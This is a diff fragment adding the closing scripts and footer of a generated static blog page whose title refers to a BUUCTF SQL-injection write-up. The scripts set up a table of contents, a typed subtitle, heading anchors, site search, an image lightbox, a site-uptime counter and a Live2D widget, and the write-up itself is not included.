+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "buuctf-sql注入&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
